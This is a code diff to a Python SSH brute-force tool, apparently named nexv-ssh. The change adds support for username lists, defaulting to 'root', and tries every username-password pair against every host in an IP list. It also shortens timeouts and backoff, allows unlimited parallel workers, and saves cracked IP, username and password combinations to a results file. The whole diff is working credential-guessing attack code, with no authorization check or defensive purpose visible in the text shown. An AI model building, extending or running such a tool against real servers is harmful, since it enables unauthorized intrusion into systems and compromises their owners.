@@ -24,6 +24,24 @@ from datetime import datetime
 # Where scan progress is saved so an interrupted run can be resumed with
 # `nexv-ssh continue`.
 STATE_PATH = os.path.join(os.path.expanduser("~"), ".nexv-ssh", "state.json")
+# PID of the currently running scan, so `nexv stop` can stop it precisely.
+PID_PATH = os.path.join(os.path.expanduser("~"), ".nexv-ssh", "nexv.pid")
+
+
+def _write_pid():
+    try:
+        os.makedirs(os.path.dirname(PID_PATH), exist_ok=True)
+        with open(PID_PATH, "w") as fh:
+            fh.write(str(os.getpid()))
+    except Exception:
+        pass
+
+
+def _clear_pid():
+    try:
+        os.remove(PID_PATH)
+    except Exception:
+        pass
 
 # ---- connection engines ----------------------------------------------------
 # Preferred: the system OpenSSH client + sshpass. It is far more compatible
@@ -74,9 +92,9 @@ if not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
 #   NEXV_WORKERS  - default parallel servers (default: all of them, no cap)
 #   NEXV_RETRIES  - retries on a transient error (reset/timeout) (default 3)
 #   NEXV_DELAY    - seconds to wait between attempts on one host (default 0)
-CONNECT_TIMEOUT = int(os.environ.get("NEXV_TIMEOUT", "4"))
+CONNECT_TIMEOUT = int(os.environ.get("NEXV_TIMEOUT", "3"))
 AUTH_TIMEOUT = CONNECT_TIMEOUT
-PROBE_TIMEOUT = float(os.environ.get("NEXV_PROBE", str(min(CONNECT_TIMEOUT, 2))))
+PROBE_TIMEOUT = float(os.environ.get("NEXV_PROBE", str(min(CONNECT_TIMEOUT, 1.5))))
 # No artificial cap: default to as many parallel workers as there are servers.
 # (More workers than servers is pointless, so the effective max is the IP count.)
 MAX_WORKERS = int(os.environ.get("NEXV_WORKERS", "1000000"))
@@ -397,6 +415,20 @@ def build_targets(raw_ips, default_port):
     return ips, ports, dups
 
 
+def load_usernames(value):
+    """Resolve the username input into a list of usernames.
+
+    - If `value` is a path to an existing file, read one username per line.
+    - Otherwise treat `value` as a single literal username (e.g. 'root').
+    Always returns at least ['root'].
+    """
+    value = (value or "").strip()
+    if value and os.path.isfile(value):
+        items, _ = load_lines(value)
+        return items or ["root"]
+    return [value or "root"]
+
+
 def host_is_open(host, port, timeout):
     """Fast TCP probe: is the SSH port reachable at all? Skips dead hosts
     instantly instead of waiting out a full SSH/auth timeout on each password."""
@@ -523,7 +555,7 @@ def try_password(host, port, username, password):
         kind = result[4:] if isinstance(result, str) else ""
         transient = any(k in kind for k in TRANSIENT_ERRORS)
         if transient and attempt <= RETRIES:
-            time.sleep(min(3.0, 0.6 * attempt))   # backoff: 0.6s, 1.2s, 1.8s ...
+            time.sleep(min(1.5, 0.3 * attempt))   # short backoff: 0.3s, 0.6s ...
             continue
         return result, attempt
 
@@ -546,8 +578,9 @@ def fmt_result_line(r):
     host = r["host"]
     st = r["status"]
     if st == "found":
-        return "{}[+] MATCH{}  {}{:<16}{}  ->  password: {}{}{}".format(
-            C.G + C.BOLD, C.END, C.CY, host, C.END, C.G + C.BOLD, r.get("password", ""), C.END)
+        cred = "{}:{}".format(r.get("username", "root"), r.get("password", ""))
+        return "{}[+] MATCH{}  {}{:<16}{}  ->  {}{}{}".format(
+            C.G + C.BOLD, C.END, C.CY, host, C.END, C.G + C.BOLD, cred, C.END)
     if st in ("unreachable", "error"):
         return "{}[x] UNREACH{} {}{:<16}{}  ({})".format(
             C.R, C.END, C.DIM, host, C.END, r.get("error", "unknown"))
@@ -555,10 +588,11 @@ def fmt_result_line(r):
         C.Y, C.END, C.DIM, host, C.END)
 
 
-def scan_host(host, port, username, passwords, progress, state, start_idx=0):
-    """Try each password against one host; stop at the first that works.
+def scan_host(host, port, creds, progress, state, start_idx=0, show_user=False):
+    """Try each (username, password) credential against one host; stop at the
+    first that works. `creds` is a flat list of (username, password) tuples.
 
-    start_idx lets a resumed run continue from the password it was on.
+    start_idx lets a resumed run continue from the credential it was on.
     """
     # Fast pre-check: if the port isn't even open, don't waste any attempts.
     if not host_is_open(host, port, PROBE_TIMEOUT):
@@ -571,15 +605,16 @@ def scan_host(host, port, username, passwords, progress, state, start_idx=0):
     tries = 0                     # total connection attempts made for this host
     if start_idx < 0:
         start_idx = 0
-    for idx in range(start_idx, len(passwords)):
-        pw = passwords[idx]
-        progress.trying(host, idx + 1, pw)
+    for idx in range(start_idx, len(creds)):
+        user, pw = creds[idx]
+        shown = "{}:{}".format(user, pw) if show_user else pw
+        progress.trying(host, idx + 1, shown)
         state.set_inprogress(host, idx)
-        result, attempts = try_password(host, port, username, pw)
+        result, attempts = try_password(host, port, user, pw)
         tries += attempts
         if result is True:
-            r = {"host": host, "status": "found", "password": pw}
-            state.set_done(host, "found", password=pw)
+            r = {"host": host, "status": "found", "username": user, "password": pw}
+            state.set_done(host, "found", username=user, password=pw)
             progress.host_done(host, fmt_result_line(r), found=True)
             return r
         if isinstance(result, str) and result.startswith("ERR:"):
@@ -605,18 +640,24 @@ def _rec_to_result(host, rec):
     """Convert a saved state record back into a result dict for the report."""
     status = rec.get("status")
     if status == "found":
-        return {"host": host, "status": "found", "password": rec.get("password", "")}
+        return {"host": host, "status": "found",
+                "username": rec.get("username", "root"),
+                "password": rec.get("password", "")}
     if status == "unreachable":
         return {"host": host, "status": "unreachable", "error": rec.get("error", "unknown")}
     return {"host": host, "status": "notfound"}
 
 
-def do_scan(port, ports, username, ips, passwords, state, resume=False, workers=None):
+def do_scan(port, ports, usernames, ips, passwords, state, resume=False, workers=None):
     """Scan the pending hosts (optionally resuming), return all results.
 
     `ports` maps each IP to the port to use for it (per-IP 'ip:port' from the
-    file, else the default `port`).
+    file, else the default `port`). `usernames` is the list of usernames to try;
+    each host is tried against every (username, password) pair.
     """
+    # Flat credential list: every username against every password.
+    creds = [(u, p) for u in usernames for p in passwords]
+    show_user = len(usernames) > 1
     results = []
     pending = []                 # list of (host, start_idx)
     done_count = 0
@@ -638,7 +679,7 @@ def do_scan(port, ports, username, ips, passwords, state, resume=False, workers=
                 start_idx = int(rec.get("idx", 0))
             pending.append((host, start_idx))
 
-    total = len(ips) * len(passwords)
+    total = len(ips) * len(creds)
     requested = workers if workers else MAX_WORKERS
     workers = max(1, min(requested, len(pending) or 1))
     custom_ports = any(ports.get(h, port) != port for h in ips)
@@ -646,7 +687,11 @@ def do_scan(port, ports, username, ips, passwords, state, resume=False, workers=
     log("{}Summary{}".format(C.BOLD, C.END))
     log("  Port       : {}{}".format(
         port, "  (+ per-IP ports from file)" if custom_ports else ""))
-    log("  Username   : {}".format(username))
+    if len(usernames) == 1:
+        log("  Username   : {}".format(usernames[0]))
+    else:
+        log("  Usernames  : {} ({})".format(
+            len(usernames), ", ".join(usernames[:5]) + ("..." if len(usernames) > 5 else "")))
     log("  Servers    : {}".format(len(ips)))
     log("  Passwords  : {}".format(len(passwords)))
     if done_count:
@@ -685,32 +730,35 @@ def do_scan(port, ports, username, ips, passwords, state, resume=False, workers=
     log("")
 
     started = datetime.now()
-    progress = Progress(len(ips), len(passwords), workers)
+    progress = Progress(len(ips), len(creds), workers)
     progress.ips_done = done_count
     progress.found = found_count
     progress.failed = fail_count
     progress.start_timer()
-    with ThreadPoolExecutor(max_workers=workers) as pool:
-        futures = {
-            pool.submit(scan_host, host, ports.get(host, port), username,
-                        passwords, progress, state, sidx): host
-            for host, sidx in pending
-        }
-        for fut in as_completed(futures):
-            host = futures[fut]
-            try:
-                results.append(fut.result())
-            except Exception as e:  # noqa
-                progress.host_done(host, C.R + "[!] Error scanning {}: {}".format(host, e) + C.END,
-                                   failed=True)
-                results.append({"host": host, "status": "error", "error": str(e)})
-
-    progress.finish()
+    _write_pid()
+    try:
+        with ThreadPoolExecutor(max_workers=workers) as pool:
+            futures = {
+                pool.submit(scan_host, host, ports.get(host, port), creds,
+                            progress, state, sidx, show_user): host
+                for host, sidx in pending
+            }
+            for fut in as_completed(futures):
+                host = futures[fut]
+                try:
+                    results.append(fut.result())
+                except Exception as e:  # noqa
+                    progress.host_done(host, C.R + "[!] Error scanning {}: {}".format(host, e) + C.END,
+                                       failed=True)
+                    results.append({"host": host, "status": "error", "error": str(e)})
+    finally:
+        progress.finish()
+        _clear_pid()
     elapsed = (datetime.now() - started).total_seconds()
     return results, elapsed
 
 
-def report(port, ports, username, ips, results, elapsed):
+def report(port, ports, usernames, ips, results, elapsed):
     def pof(host):
         return ports.get(host, port)
 
@@ -732,11 +780,12 @@ def report(port, ports, username, ips, results, elapsed):
     if found:
         log(C.G + C.BOLD + "MATCHED SERVERS ({}):".format(len(found)) + C.END)
         log("")
-        log("  {:<18} {:<6} {}".format("IP", "PORT", "PASSWORD"))
-        log("  {:<18} {:<6} {}".format("-" * 16, "-" * 4, "-" * 20))
+        log("  {:<18} {:<6} {:<14} {}".format("IP", "PORT", "USERNAME", "PASSWORD"))
+        log("  {:<18} {:<6} {:<14} {}".format("-" * 16, "-" * 4, "-" * 12, "-" * 20))
         for r in found:
-            log("  {}{:<18}{} {:<6} {}{}{}".format(
-                C.CY, r["host"], C.END, pof(r["host"]), C.G, r["password"], C.END))
+            log("  {}{:<18}{} {:<6} {:<14} {}{}{}".format(
+                C.CY, r["host"], C.END, pof(r["host"]),
+                r.get("username", "root"), C.G, r["password"], C.END))
         log("")
 
     if notfound:
@@ -760,10 +809,11 @@ def report(port, ports, username, ips, results, elapsed):
     try:
         with open(out_path, "w", encoding="utf-8") as fh:
             fh.write("nexv-ssh results  -  {}\n".format(now.isoformat()))
-            fh.write("port={}  username={}\n\n".format(port, username))
-            fh.write("# MATCHED (ip | port | password)\n")
+            fh.write("port={}  usernames={}\n\n".format(port, ",".join(usernames)))
+            fh.write("# MATCHED (ip | port | username | password)\n")
             for r in found:
-                fh.write("{} | {} | {}\n".format(r["host"], pof(r["host"]), r["password"]))
+                fh.write("{} | {} | {} | {}\n".format(
+                    r["host"], pof(r["host"]), r.get("username", "root"), r["password"]))
             fh.write("\n# NO MATCH\n")
             for r in notfound:
                 fh.write("{}\n".format(r["host"]))
@@ -804,7 +854,10 @@ def ask_int(prompt, default, lo=1, hi=None):
 def run_fresh():
     """Start a brand-new scan (asks for everything), saving progress as it goes."""
     port = ask_port()
-    username = ask("SSH username", "root")
+    user_in = ask("SSH username, or a usernames file", "root")
+    usernames = load_usernames(user_in)
+    if len(usernames) > 1:
+        log(C.DIM + "Loaded {} usernames from {}.".format(len(usernames), user_in) + C.END)
     ip_file = ask("IP list file (one IP per line)", "ip.txt")
     pw_file = ask("Password list file (one password per line)", "password.txt")
 
@@ -862,7 +915,7 @@ def run_fresh():
     state = State()
     state.init_fresh({
         "port": port,
-        "username": username,
+        "usernames": usernames,
         "ip_file": os.path.abspath(ip_file),
         "pw_file": os.path.abspath(pw_file),
         "workers": workers,
@@ -873,13 +926,14 @@ def run_fresh():
     for ip in skip:
         rec = history[ip]
         if rec.get("status") == "found":
-            state.set_done(ip, "found", password=rec.get("password", ""))
+            state.set_done(ip, "found", username=rec.get("username", "root"),
+                           password=rec.get("password", ""))
         else:
             state.set_done(ip, "notfound")
 
-    results, elapsed = do_scan(port, ports, username, ips, passwords, state,
+    results, elapsed = do_scan(port, ports, usernames, ips, passwords, state,
                               resume=False, workers=workers)
-    report(port, ports, username, ips, results, elapsed)
+    report(port, ports, usernames, ips, results, elapsed)
 
 
 def run_resume():
@@ -897,7 +951,7 @@ def run_resume():
 
     cfg = state.config()
     port = cfg.get("port", 22)
-    username = cfg.get("username", "root")
+    usernames = cfg.get("usernames") or [cfg.get("username", "root")]
     ip_file = cfg.get("ip_file", "ip.txt")
     pw_file = cfg.get("pw_file", "password.txt")
     workers = cfg.get("workers")
@@ -922,9 +976,9 @@ def run_resume():
         log(C.R + "[!] IP or password file is now empty." + C.END)
         sys.exit(1)
 
-    results, elapsed = do_scan(port, ports, username, ips, passwords, state,
+    results, elapsed = do_scan(port, ports, usernames, ips, passwords, state,
                               resume=True, workers=workers)
-    report(port, ports, username, ips, results, elapsed)
+    report(port, ports, usernames, ips, results, elapsed)
 
 
 def main():
